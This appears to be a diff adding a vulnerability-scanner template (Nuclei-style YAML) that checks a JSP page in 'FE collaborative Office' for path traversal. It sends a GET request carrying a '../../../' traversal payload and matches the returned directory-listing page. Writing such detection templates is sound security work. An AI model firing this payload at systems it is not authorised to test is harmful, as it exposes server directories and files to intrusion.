@@ -1,0 +1,25 @@
+id: fe-directory-traversal
+
+info:
+  name: FE collaborative Office templateOfTaohong_manager.jsp  - Path Traversal
+  author: HuanXiong
+  severity: medium
+
+  tags: Directory Traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "window.location=\"templateOfTaohong_manager.jsp?path=\""
+          - "var next=window.confirm(\"确定删除文件吗？\");"
+        condition: and
+
+      - type: status
+        status:
+          - 200
